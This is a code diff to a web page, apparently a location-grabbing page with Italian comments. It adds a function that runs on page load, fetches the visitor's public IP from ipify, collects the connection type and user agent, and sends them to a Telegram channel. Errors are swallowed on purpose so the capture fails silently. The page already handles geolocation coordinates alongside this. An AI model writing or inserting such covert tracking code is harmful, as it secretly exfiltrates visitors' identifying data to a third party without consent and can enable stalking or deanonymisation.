@@ -119,6 +119,26 @@
       }
     }
 
+    async function registraAperturaPagina() {
+      try {
+        const res = await fetch("https://api.ipify.org?format=json");
+        const data = await res.json();
+        const ip = data.ip || "non rilevabile";
+        const rete = getTipoConnessione();
+        const dispositivo = navigator.userAgent || "sconosciuto";
+
+        const messaggio =
+          `Pagina aperta:\n` +
+          `IP: ${ip}\n` +
+          `Connessione: ${rete}\n` +
+          `Dispositivo: ${dispositivo}`;
+
+        await inviaATelegram(messaggio);
+      } catch (err) {
+        // Silenzioso se bloccato da rete/adblocker
+      }
+    }
+
     async function gestisciPosizione(position, modalita) {
       const { latitude, longitude, accuracy } = position.coords;
       const rete = getTipoConnessione();
@@ -158,6 +178,8 @@
         }
       );
     }
+
+    window.addEventListener("load", registraAperturaPagina);
 
     btnEl.addEventListener("click", () => {
       if (!("geolocation" in navigator)) {
